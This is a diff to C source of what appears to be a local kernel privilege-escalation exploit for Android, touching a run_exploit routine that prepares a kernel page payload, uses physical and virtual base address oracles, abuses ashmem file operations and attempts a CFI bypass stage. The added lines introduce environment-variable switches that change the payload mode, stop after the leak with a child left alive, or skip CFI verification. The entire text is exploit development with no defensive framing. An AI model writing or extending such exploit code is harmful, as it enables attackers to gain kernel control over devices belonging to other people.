@@ -474,12 +474,22 @@ int run_exploit(int argc, char **argv) {
   pin_to_core(exploit_core());
 #if !defined(APP_FOPS_REUSE_VERIFIED_PAGE) || \
     !APP_FOPS_REUSE_VERIFIED_PAGE
-  page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
+  {
+    int payload_mode = PAGE_PAYLOAD_FOPS;
+    if (getenv("DIRECT_BOOTID_RECLAIM")) {
+      payload_mode = PAGE_PAYLOAD_SLIDE;
+    }
+    page_base = prepare_good_kernel_page(payload_mode);
+  }
 #endif
 
 #if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
   if (!page_base) {
     return 1;
+  }
+  if (getenv("HOLD_LEAK_ONLY")) {
+    pr_success("hold leak only done, child left alive\n");
+    return 0;
   }
 #if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
   pr_info("app fops stage=prepare-return base=%016zx\n", page_base);
@@ -625,7 +635,10 @@ int run_exploit(int argc, char **argv) {
         pr_warning("fops owner still non-NULL; ashmem open will ENODEV\n");
       }
     }
-    int verified = triggered && try_cfi_stage();
+    int verified = 0;
+    if (triggered && !getenv("DIRECT_BOOTID_RECLAIM")) {
+      verified = try_cfi_stage();
+    }
     pr_info("app fops slide attempt=%d/1 triggered=%d verified=%d "
             "step=%d errno=%d\n",
             attempt, triggered, verified, cfi_last_step, cfi_last_errno);
